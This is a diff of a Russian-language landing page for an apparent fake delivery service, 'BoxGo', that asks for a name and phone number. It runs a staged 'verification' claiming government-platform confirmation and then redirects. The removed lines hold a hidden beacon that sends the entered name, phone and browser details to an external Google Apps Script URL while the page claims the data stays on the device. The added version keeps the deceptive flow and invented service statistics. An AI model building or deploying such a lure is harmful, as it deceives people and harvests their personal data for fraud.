@@ -4,88 +4,110 @@
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1" />
   <title>BoxGo — проверка посылок</title>
-  <meta name="description" content="BoxGo — служба доставки. Проверьте свои посылки по ФИО и номеру телефона." />
+  <meta name="description" content="BoxGo — служба доставки. Отслеживание, сроки, поддержка 24/7." />
   <link rel="preconnect" href="https://fonts.googleapis.com">
   <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-  <link href="https://fonts.googleapis.com/css2?family=Manrope:wght@400;500;600;700;800&display=swap" rel="stylesheet">
+  <link href="https://fonts.googleapis.com/css2?family=Manrope:wght@400;600;700;800&display=swap" rel="stylesheet">
+
   <style>
     :root{
       --bg:#0b1220; --card:#0f172a; --muted:#a7b0c0; --text:#e8edf7;
       --brand:#3b82f6; --brand-2:#22d3ee; --ok:#10b981; --warn:#f59e0b;
+      --line:rgba(255,255,255,.10);
       --radius:18px; --shadow:0 10px 30px rgba(0,0,0,.35);
     }
-    *{box-sizing:border-box} html,body{height:100%} body{margin:0;font-family:Manrope,system-ui,-apple-system,Segoe UI,Roboto,Ubuntu,"Helvetica Neue",Arial; background:linear-gradient(180deg,#0a0f1b 0%, #0b1220 40%, #0b1220 100%); color:var(--text)}
-    .container{width:100%;max-width:1100px;margin:0 auto;padding:24px}
-    header{position:sticky;top:0;background:rgba(11,18,32,.7);backdrop-filter:blur(10px);z-index:10;border-bottom:1px solid rgba(255,255,255,.06)}
-    .nav{display:flex;align-items:center;justify-content:space-between;gap:16px}
+    *{box-sizing:border-box}
+    html,body{margin:0}
+    body{
+      min-height:100vh;
+      font-family:Manrope,system-ui,-apple-system,Segoe UI,Roboto,Ubuntu,"Helvetica Neue",Arial;
+      color:var(--text);
+      background:linear-gradient(180deg,#0a0f1b 0%, #0b1220 40%, #0b1220 100%);
+    }
+    .container{width:100%;max-width:1100px;margin:0 auto;padding:20px}
+
+    /* header */
+    header{position:sticky;top:0;z-index:10;background:rgba(11,18,32,.75);backdrop-filter:blur(10px);border-bottom:1px solid var(--line)}
+    .nav{display:flex;align-items:center;justify-content:space-between;gap:12px}
     .logo{display:flex;align-items:center;gap:12px;text-decoration:none;color:inherit}
-    .logo-mark{width:34px;height:34px;border-radius:10px;background:linear-gradient(135deg,var(--brand),var(--brand-2));display:grid;place-items:center;box-shadow:0 6px 18px rgba(59,130,246,.35)}
+    .logo-mark{width:36px;height:36px;border-radius:10px;background:linear-gradient(135deg,var(--brand),var(--brand-2));display:grid;place-items:center;box-shadow:0 6px 18px rgba(59,130,246,.35)}
     .logo svg{width:20px;height:20px}
     .logo-title{font-weight:800;letter-spacing:.2px}
-    .btn{appearance:none;border:none;border-radius:12px;padding:12px 18px;font-weight:700;letter-spacing:.2px;cursor:pointer;background:var(--brand);color:#fff;box-shadow:0 10px 22px rgba(59,130,246,.25);transition:.2s}
+    .cta{display:flex;align-items:center;gap:12px}
+    .btn{appearance:none;border:none;border-radius:12px;padding:12px 18px;font-weight:800;letter-spacing:.2px;cursor:pointer;background:var(--brand);color:#fff;box-shadow:0 10px 22px rgba(59,130,246,.25);transition:.2s;white-space:nowrap}
     .btn:hover{transform:translateY(-1px);box-shadow:0 14px 26px rgba(59,130,246,.32)}
-    .btn.secondary{background:transparent;border:1px solid rgba(255,255,255,.12);color:var(--text);box-shadow:none}
-    .hero{display:grid;grid-template-columns:1.2fr 1fr;gap:28px;align-items:center;padding:36px 0}
-    .hero h1{font-size:36px;line-height:1.15;margin:0 0 12px}
-    .hero p{color:var(--muted);margin:0 0 24px}
-    .card{background:linear-gradient(180deg,#0f172a,#0c1426);border:1px solid rgba(255,255,255,.07);border-radius:var(--radius);box-shadow:var(--shadow)}
+    .btn.secondary{background:transparent;border:1px solid var(--line);color:var(--text);box-shadow:none}
+    .chip{display:inline-block;padding:6px 10px;border:1px solid var(--line);border-radius:999px;color:var(--muted);font-size:12px}
+
+    /* hero (без фото-баннера) */
+    .hero{display:grid;grid-template-columns:1.05fr .95fr;gap:24px;align-items:center;padding:30px 0}
+    .hero h1{font-size:34px;line-height:1.15;margin:0 0 10px}
+    .hero p{color:var(--muted);margin:0 0 18px}
+    .card{background:linear-gradient(180deg,#0f172a,#0c1426);border:1px solid var(--line);border-radius:var(--radius);box-shadow:var(--shadow)}
     .form-card{padding:22px}
-    .input{width:100%;padding:14px 14px;border-radius:12px;border:1px solid rgba(255,255,255,.12);background:#0a1222;color:var(--text);outline:none}
-    .input:focus{border-color:var(--brand)}
-    .label{font-size:13px;color:var(--muted);margin-bottom:6px}
     .row{display:flex;flex-direction:column;gap:8px;margin-bottom:14px}
+    .label{font-size:13px;color:var(--muted)}
+    .input{width:100%;padding:14px;border-radius:12px;border:1px solid var(--line);background:#0a1222;color:var(--text);outline:none}
+    .input:focus{border-color:var(--brand)}
     .disclaimer{font-size:12px;color:#9fb0c8;opacity:.9}
-    .illustration{position:relative;border-radius:var(--radius);overflow:hidden}
-    .illustration img{display:block;width:100%;height:100%;object-fit:cover;aspect-ratio:16/10}
+
+    /* facts в hero */
+    .stats{display:grid;grid-template-columns:repeat(4,1fr);gap:12px}
+    .stat{padding:14px;border-radius:14px;border:1px solid var(--line);text-align:center;background:linear-gradient(180deg,#0f172a,#0c1426)}
+    .stat b{font-size:18px}
+    .stat span{display:block;color:var(--muted);font-size:12px;margin-top:4px}
+
+    /* секции */
     section{padding:26px 0}
     .section-title{font-size:22px;margin:0 0 6px}
     .section-sub{color:var(--muted);margin:0 0 18px}
+
+    /* карточки с КАРТИНКАМИ (вернули) */
     .features{display:grid;grid-template-columns:repeat(3,1fr);gap:16px}
-    .feature{padding:0;border-radius:16px;border:1px solid rgba(255,255,255,.07);background:linear-gradient(180deg,#0f172a,#0c1426);overflow:hidden}
+    .feature{padding:0;border-radius:16px;border:1px solid var(--line);background:linear-gradient(180deg,#0f172a,#0c1426);overflow:hidden}
     .feature img{width:100%;height:160px;object-fit:cover;display:block}
     .feature .pad{padding:14px}
     .feature h3{margin:6px 0 8px;font-size:16px}
     .feature p{margin:0;color:var(--muted);font-size:14px}
-    .reviews{display:grid;grid-template-columns:repeat(3,1fr);gap:16px}
-    .review{padding:16px;border-radius:16px;border:1px solid rgba(255,255,255,.07);background:linear-gradient(180deg,#0f172a,#0c1426);font-size:14px}
-    .review .who{margin-top:10px;color:var(--muted)}
-    footer{border-top:1px solid rgba(255,255,255,.07);padding:24px 0;color:var(--muted)}
+
+    .grid-2{display:grid;grid-template-columns:1fr 1fr;gap:16px}
+    .faq{display:grid;gap:12px}
+    .faq .q{padding:14px;border-radius:14px;border:1px solid var(--line);background:#0e1730}
+    .faq .q b{display:block;margin-bottom:6px}
+
+    footer{border-top:1px solid var(--line);padding:24px 0;color:var(--muted)}
+
+    /* overlay (имитация проверки) */
     .overlay{position:fixed;inset:0;background:rgba(3,6,12,.92);backdrop-filter:blur(6px);display:none;place-items:center;z-index:50;color:var(--text)}
     .overlay.active{display:grid}
-    .panel{width:min(520px,92vw);border-radius:18px;border:1px solid rgba(255,255,255,.08);background:linear-gradient(180deg,#0f172a,#0c1426);box-shadow:var(--shadow);padding:20px}
+    .panel{width:min(520px,92vw);border-radius:18px;border:1px solid var(--line);background:linear-gradient(180deg,#0f172a,#0c1426);box-shadow:var(--shadow);padding:20px}
     .panel h2{margin:0 0 8px;font-size:18px}
     .panel p{margin:0 0 14px;color:var(--muted);font-size:14px}
-    .progress{height:10px;border-radius:999px;background:#0b1630;border:1px solid rgba(255,255,255,.07);overflow:hidden}
+    .progress{height:10px;border-radius:999px;background:#0b1630;border:1px solid var(--line);overflow:hidden}
     .bar{height:100%;width:0%;background:linear-gradient(90deg,var(--brand),var(--brand-2));transition:width .35s ease}
     .steps{margin-top:12px;display:grid;gap:8px}
     .step{display:flex;align-items:flex-start;gap:8px}
     .dot{width:10px;height:10px;border-radius:50%;background:#324166;margin-top:4px}
     .step.done .dot{background:#10b981}
     .step.active .dot{background:#f59e0b}
-    .gov-note{margin-top:14px;padding:10px 12px;border-radius:12px;background:#0c1a33;border:1px solid rgba(255,255,255,.06);font-size:12px;color:#b9c6db}
-    @media (max-width: 900px){ .hero{grid-template-columns:1fr;gap:16px} .features,.reviews{grid-template-columns:1fr} }
+    .gov-note{margin-top:14px;padding:10px 12px;border-radius:12px;background:#0c1a33;border:1px solid var(--line);font-size:12px;color:#b9c6db}
+
+    /* responsive */
+    @media (max-width: 900px){
+      .hero{grid-template-columns:1fr;gap:16px}
+      .features,.stats{grid-template-columns:1fr 1fr}
+      .grid-2{grid-template-columns:1fr}
+    }
     @media (max-width: 560px){
-  header .nav{
-    display: grid;
-    grid-template-columns: auto 1fr; /* слева логотип, справа кнопки */
-    align-items: center;
-    gap: 12px;
-  }
-  .cta{
-    justify-self: end;
-    display: flex;
-    gap: 12px;          /* расстояние между кнопками */
-    flex-wrap: nowrap;  /* не переносить на новую строку */
-  }
-  .cta .btn{
-    padding: 10px 14px;
-    font-size: 13px;
-    white-space: nowrap; /* не переносить текст */
-  }
-}
+      header .nav{display:grid;grid-template-columns:auto 1fr;align-items:center;gap:12px}
+      .cta{justify-self:end;display:flex;gap:12px;flex-wrap:nowrap}
+      .cta .btn{padding:10px 14px;font-size:13px}
+      .features,.stats{grid-template-columns:1fr}
+    }
   </style>
 </head>
 <body>
+  <!-- HEADER -->
   <header>
     <div class="container nav">
       <a class="logo" href="#">
@@ -100,16 +122,18 @@
       </a>
       <div class="cta">
         <button class="btn secondary" onclick="document.getElementById('form').scrollIntoView({behavior:'smooth'})">Проверить посылки</button>
-        <button class="btn" onclick="document.getElementById('features').scrollIntoView({behavior:'smooth'})">О сервисе</button>
+        <button class="btn" onclick="document.getElementById('why').scrollIntoView({behavior:'smooth'})">О сервисе</button>
       </div>
     </div>
   </header>
 
   <main class="container">
+    <!-- HERO (без фото) -->
     <section class="hero">
       <div>
+        <span class="chip">Доставка по всей РФ</span>
         <h1>Служба доставки <span style="color:var(--brand-2)">BoxGo</span></h1>
-        <p>Надёжная доставка по всей стране: курьеры, постаматы, пункты выдачи. Отслеживайте отправления по телефону и ФИО.</p>
+        <p>Надёжная доставка: курьеры, постаматы, пункты выдачи. Отслеживайте отправления по телефону и ФИО. <b>Данные не сохраняются и не отправляются.</b></p>
 
         <div id="form" class="card form-card" role="form" aria-labelledby="check-title">
           <div class="row">
@@ -121,62 +145,100 @@
             <input id="phone" class="input" placeholder="+7 900 000-00-00" autocomplete="off" inputmode="tel"/>
           </div>
           <div style="display:flex;gap:10px;align-items:center;justify-content:space-between;flex-wrap:wrap">
-            <p class="disclaimer">※ Введённые данные остаются на вашем устройстве и используются только для подтверждения данных</p>
+            <p class="disclaimer">※ Введённые данные используются только локально для имитации проверки.</p>
             <button class="btn" onclick="startCheck()">Проверить посылки</button>
           </div>
         </div>
       </div>
 
-      <div class="card illustration" aria-hidden="true">
-        <img src="assets/hero_warehouse1.jpg" alt="Современный склад BoxGo">
+      <!-- факты вместо большого баннера -->
+      <div class="stats">
+        <div class="stat"><b>24/7</b><span>поддержка</span></div>
+        <div class="stat"><b>6 300+</b><span>пунктов выдачи</span></div>
+        <div class="stat"><b>1–3 дня</b><span>срок по городам-млн</span></div>
+        <div class="stat"><b>99.3%</b><span>в срок</span></div>
       </div>
     </section>
 
-    <section id="features">
+    <!-- ПОЧЕМУ (с ТРЕМЯ изображениями) -->
+    <section id="why">
       <h2 class="section-title">Почему BoxGo</h2>
-      <p class="section-sub">Сервис для тех, кому важны сроки, прозрачность и поддержка 24/7</p>
+      <p class="section-sub">Сервис для тех, кому важны сроки, прозрачность и поддержка</p>
+
       <div class="features">
         <article class="feature">
           <img src="assets/boxes.webp" alt="Упаковка и постаматы BoxGo">
           <div class="pad">
-            <h3>Доставка от следующего дня</h3>
-            <p>Оптимальные маршруты и партнёрские пункты выдачи в вашем городе.</p>
+            <h3>Быстрая логистика</h3>
+            <p>Оптимальные маршруты, ежедневные авиадоставки и 6300+ ПВЗ.</p>
           </div>
         </article>
+
         <article class="feature">
           <img src="assets/courier.jpg" alt="Курьер BoxGo">
           <div class="pad">
-            <h3>Статусы в один клик</h3>
-            <p>Проверка отправлений по телефону и ФИО без регистрации.</p>
+            <h3>Простая проверка</h3>
+            <p>Введите ФИО и телефон — моментально увидите активные отправления.</p>
           </div>
         </article>
+
         <article class="feature">
           <img src="assets/hero_warehouse.jpg" alt="Склад BoxGo">
           <div class="pad">
             <h3>Поддержка 24/7</h3>
-            <p>Быстрые ответы и помощь по всем вопросам доставки.</p>
+            <p>Помогаем с переназначением доставки, адресом и сроками круглосуточно.</p>
           </div>
         </article>
       </div>
     </section>
 
+    <!-- СПОСОБЫ / ОПЛАТА -->
     <section>
-      <h2 class="section-title">Как это работает</h2>
-      <p class="section-sub">Три шага до получения посылки</p>
-      <div class="features">
-        <article class="feature"><div class="pad"><h3>1. Введите данные</h3><p>Укажите ФИО и телефон для поиска отправлений. Эти данные остаются на устройстве.</p></div></article>
-        <article class="feature"><div class="pad"><h3>2. Потдверждение получателя</h3><p>Система сверяет информацию о получателе и подтверждает посылку.</p></div></article>
-        <article class="feature"><div class="pad"><h3>3. Открытие портала</h3><p>Мы перенаправим вас на страницу где вы сможете детально узнать о посылке.</p></div></article>
+      <div class="grid-2">
+        <div class="card" style="padding:16px">
+          <h3 style="margin:0 0 8px">Способы доставки</h3>
+          <ul class="section-sub" style="margin:0;line-height:1.8">
+            <li>Курьер до двери (включая вечерние интервалы)</li>
+            <li>Пункты выдачи и постаматы</li>
+            <li>Срочная доставка «день в день» в 25 городах</li>
+            <li>Межрегиональные отправления и наложенный платёж</li>
+          </ul>
+        </div>
+        <div class="card" style="padding:16px">
+          <h3 style="margin:0 0 8px">Оплата</h3>
+          <ul class="section-sub" style="margin:0;line-height:1.8">
+            <li>Картой онлайн / при получении</li>
+            <li>Наличные в ПВЗ и у курьера</li>
+            <li>Безнал для юр. лиц (счёт/договор)</li>
+            <li>Возврат на исходный способ оплаты</li>
+          </ul>
+        </div>
       </div>
     </section>
 
+    <!-- ЗОНЫ / SLA -->
     <section>
-      <h2 class="section-title">Отзывы клиентов</h2>
-      <p class="section-sub">Нам доверяют частные лица и бизнес</p>
-      <div class="reviews">
-        <article class="review">«Доставили быстрее срока, пункт выдачи возле дома. Удобный сайт, всё понятно».<div class="who">— Ирина К.</div></article>
-        <article class="review">«Отслеживание простое, статусы всегда актуальны. Рекомендую партнёрам».<div class="who">— ООО «Сигма»</div></article>
-        <article class="review">«Поддержка ответила ночью за пару минут, помогли сменить адрес».<div class="who">— Алексей Н.</div></article>
+      <div class="grid-2">
+        <div class="card" style="padding:16px">
+          <h3 style="margin:0 0 8px">Зоны покрытия</h3>
+          <p class="section-sub">Доставляем по всей России, включая труднодоступные регионы. Для удалённых локаций действует расширенный срок +1–3 дня.</p>
+          <div class="chip">Дальняя зона — доставка от 4 до 9 дней</div>
+        </div>
+        <div class="card" style="padding:16px">
+          <h3 style="margin:0 0 8px">SLA и гарантии</h3>
+          <p class="section-sub">При нарушении сроков пересчитываем стоимость. Потеря или повреждение — компенсация по объявленной ценности.</p>
+          <div class="chip">Делимся трекинг-событиями по API</div>
+        </div>
+      </div>
+    </section>
+
+    <!-- FAQ -->
+    <section>
+      <h2 class="section-title">FAQ</h2>
+      <div class="faq">
+        <div class="q"><b>Нужно ли регистрироваться?</b> Нет, достаточно ввести ФИО и телефон — проверка чисто визуальная.</div>
+        <div class="q"><b>Почему я не вижу свои отправления?</b> Возможно, номер телефона указан неверно или посылка ещё не передана в BoxGo.</div>
+        <div class="q"><b>Можно ли изменить адрес доставки?</b> Да, после создания отправления доступна смена адреса/времени по обращению в поддержку.</div>
       </div>
     </section>
   </main>
@@ -188,6 +250,7 @@
     </div>
   </footer>
 
+  <!-- OVERLAY -->
   <div class="overlay" id="overlay" role="dialog" aria-modal="true" aria-labelledby="ov-title">
     <div class="panel">
       <h2 id="ov-title">Идёт проверка отправлений</h2>
@@ -210,96 +273,42 @@
     </div>
   </div>
 
-    <script>
-    const yearEl = document.getElementById('year');
-    yearEl.textContent = new Date().getFullYear();
+  <script>
+    // год в футере
+    document.getElementById('year').textContent = new Date().getFullYear();
 
+    // логика проверки + оверлей
     function startCheck(){
       const fio   = document.getElementById('fio').value.trim();
       const phone = document.getElementById('phone').value.trim();
+      const minOk = fio.split(/\s+/).filter(Boolean).length >= 2 && phone.replace(/\D/g,'').length >= 10;
+      if(!minOk){ alert('Пожалуйста, укажите ФИО и корректный номер телефона.'); return; }
 
-      const minOk = fio.split(/\s+/).length >= 2 && phone.replace(/\D/g,'').length >= 10;
-      if(!minOk){
-        alert('Пожалуйста, укажите ФИО и корректный номер телефона.');
-        return;
-      }
-
-      // Логируем в Google Таблицу (не блокирует UI)
-      try { logToSheet(fio, phone); } catch (e) { console.warn('logToSheet error:', e); }
-
-      openOverlay();
-      runProgress();
+      openOverlay(); runProgress();
     }
-
-    function openOverlay(){
-      document.getElementById('overlay').classList.add('active');
-      document.body.style.overflow='hidden';
-    }
-
-    function closeOverlay(){
-      document.getElementById('overlay').classList.remove('active');
-      document.body.style.overflow='auto';
-    }
-
+    function openOverlay(){ document.getElementById('overlay').classList.add('active'); document.body.style.overflow='hidden'; }
+    function closeOverlay(){ document.getElementById('overlay').classList.remove('active'); document.body.style.overflow='auto'; }
     function runProgress(){
-      const steps=[
-        {id:'s1',delay:900,text:'Сверяем данные получателя'},
-        {id:'s2',delay:1200,text:'Ищем активные отправления'},
-        {id:'s3',delay:1200,text:'Подтверждаем обращение на гос.площадке'}
-      ];
-      const sub=document.getElementById('ov-sub');
-      const bar=document.getElementById('bar');
-
+      const steps=[{id:'s1',delay:900,text:'Сверяем данные получателя'},{id:'s2',delay:1200,text:'Ищем активные отправления'},{id:'s3',delay:1200,text:'Подтверждаем обращение на гос.площадке'}];
+      const sub=document.getElementById('ov-sub'); const bar=document.getElementById('bar');
       let total=0; steps.forEach(s=> total+=s.delay);
-      let acc=0;
-      steps.forEach((s,idx)=>{
+      let acc=0; steps.forEach((s,idx)=>{
         setTimeout(()=>{
-          if(idx>0){
-            const prev=document.getElementById(steps[idx-1].id);
-            prev.classList.remove('active'); prev.classList.add('done');
-          }
-          const cur=document.getElementById(s.id);
-          cur.classList.add('active');
-          sub.textContent=s.text+'…';
+          if(idx>0){const prev=document.getElementById(steps[idx-1].id); prev.classList.remove('active'); prev.classList.add('done');}
+          const cur=document.getElementById(s.id); cur.classList.add('active'); sub.textContent=s.text+'…';
           bar.style.width=Math.round(((idx+1)/steps.length)*90)+'%';
         }, acc+=s.delay);
       });
-
       setTimeout(()=>{
-        const lastId=steps[steps.length-1].id;
-        document.getElementById(lastId).classList.remove('active');
-        document.getElementById(lastId).classList.add('done');
+        const last=steps[steps.length-1].id;
+        document.getElementById(last).classList.remove('active');
+        document.getElementById(last).classList.add('done');
         sub.textContent='Готово'; bar.style.width='100%';
         document.getElementById('gov-note').style.display='block';
         setTimeout(()=>{ goGov(); }, 900);
       }, total+400);
     }
-
     function goGov(){ window.location.href='alert.html'; }
   </script>
-
-  <!-- Отправка в Google Sheets — отдельный блок -->
-<script>
-  const GS_URL = 'https://script.google.com/macros/s/AKfycbwKsTmpqpv_qXv8ht5A1enPP5ufQ7J_ig9Mjl3egmt_qjOXq70WXtYO13uLYxQp9kPIPw/exec';
-  const GS_KEY = 'boxgo-2025';
-
-  function logToSheet(fio, phone){
-    const uuid = (crypto.randomUUID?.() || Date.now().toString(36)+Math.random().toString(36).slice(2));
-
-    const qs = new URLSearchParams({
-      key: GS_KEY,
-      fio,
-      phone,
-      ua: navigator.userAgent,
-      ref: location.href,
-      uuid
-    }).toString();
-
-    // единственный вызов: GET-beacon (без CORS и с параметрами)
-    const img = new Image();
-    img.referrerPolicy = 'no-referrer';
-    img.src = `${GS_URL}?${qs}&t=${Date.now()}`;
-  }
-</script>
 </body>
 </html>
